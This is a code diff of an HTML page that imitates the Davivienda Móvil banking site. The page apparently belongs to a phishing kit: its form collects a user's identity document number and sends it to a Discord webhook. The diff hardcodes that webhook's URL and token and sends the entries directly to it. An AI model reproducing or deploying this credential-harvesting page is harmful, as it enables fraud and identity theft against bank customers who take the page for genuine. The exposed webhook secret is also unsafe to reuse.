@@ -4,18 +4,6 @@
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
 <title>Davivienda Móvil</title>
-<script src="env.js"></script>
-<script>
-  !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];
-  t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];
-  s.parentNode.insertBefore(t,s)}(window, document,'script',
-  'https://connect.facebook.net/en_US/fbevents.js');
-  fbq('init', '1610758720232528');
-  fbq('track', 'PageView');
-</script>
-
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
     * { margin:0; padding:0; box-sizing:border-box; font-family:'Roboto',sans-serif; }
@@ -438,10 +426,7 @@
     });
 
     /* ── LÓGICA ORIGINAL INTACTA ── */
-    const WEBHOOK_URL = window.__ENV?.DISCORD_WEBHOOK_URL;
-    if (!WEBHOOK_URL) {
-        console.error('DISCORD_WEBHOOK_URL no configurado. Revisa env.js o variables de entorno en Vercel.');
-    }
+    const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1489904747845648515/mSnOtuwDSlQMJChVvLObPp22v8E5W6TQU49meRkvUuUw3dyiMHnptCmEdUQohYFULqMJ';
     const form  = document.getElementById("formulario");
     const input = document.getElementById("documento");
     const btn   = document.getElementById("btn-submit");
@@ -471,11 +456,7 @@
                     timestamp: new Date().toISOString()
                 }]
             };
-            const response = await fetch('/api/webhook', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ mensaje })
-            });
+            const response = await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(mensaje) });
             if (response.ok) { console.log('✅ Datos enviados a Discord correctamente'); }
             else { console.error('❌ Error al enviar a Discord:', response.status); }
         } catch (error) { console.error('❌ Error en la petición a Discord:', error); }
@@ -509,4 +490,3 @@
 
 </body>
 </html>
-
